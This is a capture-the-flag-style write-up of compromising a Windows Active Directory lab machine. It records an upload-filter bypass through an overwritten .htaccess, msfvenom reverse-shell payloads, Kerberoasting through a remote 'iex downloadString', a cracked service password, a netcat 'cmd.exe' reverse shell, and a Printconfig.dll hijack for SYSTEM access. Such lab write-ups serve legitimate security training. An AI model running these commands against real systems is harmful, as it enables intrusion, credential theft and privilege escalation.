#Pwned! 
```IP
192.168.232.187
```
## Nmap
```
PORT     STATE SERVICE       REASON          VERSION                                    53/tcp   open  domain        syn-ack ttl 125 Simple DNS Plus                            80/tcp   open  http          syn-ack ttl 125 Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-title: Access The Event
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
| http-methods: 
|   Supported Methods: HEAD GET POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
88/tcp   open  kerberos-sec  syn-ack ttl 125 Microsoft Windows Kerberos (server time: 2024-10-26 10:49:36Z)
135/tcp  open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 125
464/tcp  open  kpasswd5?     syn-ack ttl 125
593/tcp  open  ncacn_http    syn-ack ttl 125 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 125
3268/tcp open  ldap          syn-ack ttl 125 Microsoft Windows Active Directory LDAP (Domain: access.offsec0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 125
Service Info: Host: SERVER; OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Nmap UDP


# Enumeration

## HTTP
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241026125821.png?raw=true)
we bypass the filter in upload image when buying tickets by using any other extension than php
php%20 works but it doesnt execute
.ctp also works but doesnt execute
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241026133705.png?raw=true)
We create a windows tcp reverse shell
```
msfvenom -p windows/shell_reverse_tcp  LHOST=192.168.45.187 LPORT=443 -f exe -o rev.exe
```
We overwrite the .htaccess file in order to execute the .ctp as php
```
echo "AddType application/x-httpd-php .ctp" > .htaccess
```
we upload all three files rev.exe, run.ctp and the new .htaccess
now when we execute the run.ctp. it will call rev.exe and give us a revshell
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241026134026.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241026133617.png?raw=true)
# PrivEsc

## Manual
we are an apache service account
we do not have access to local.txt flag
enumerating domain users we see MSSQL service account
we could ask for a kerberos ticket
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241027102748.png?raw=true)
with Get-SPN.ps1 we can get the SPN of the MSSQL account

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241027102834.png?raw=true)
```
Add-Type -AssemblyName System.IdentityModel
```
```
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'MSSQLSvc/DC.access.offsec'  
iex(new-object net.webclient).downloadString('http://192.168.45.201:80/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -OutputFormat Hashcat
```
we crack the obtained hash and we get
```
trustno1
```
Now we can enum shares again to check if it works
```
 nxc smb 192.168.232.187 -u 'svc_mssql' -p 'trustno1' --shares
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241027112559.png?raw=true)

we downloads invoke-runas script
```
.\Invoke-RunasCs -Username svc_mssql -Password "trustno1" -Command "whoami"
```
```
Invoke-RunasCs svc_mssql trustno1 "C:\xampp\htdocs\uploads\nc.exe 192.168.45.201 45 -e cmd.exe"
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241216101223.png?raw=true)

https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public
Running this exploit gives us permissions on 918 entries. Between them we have the following directory:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241216104138.png?raw=true)
Which previously only administrators had full control:
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241216104229.png?raw=true)
We can hijack one of the systems dll and trigger it in order to get a reverse shell. We will do this with Printconfig.dll:
```
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=192.168.45.216 LPORT=4444 -f dll -o Printconfig.dll
```
We transfer the file to our target machine and copy it to the following directory:
```
copy Printconfig.dll C:\Windows\System32\spool\drivers\x64\3\
```
And then this dll is triggered by the following commands:
```
$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
```
```
$object = [Activator]::CreateInstance($type)
```

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241216105447.png?raw=true)
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241216105437.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241216105535.png?raw=true)
## Automated

### Peass
### Mimikatz


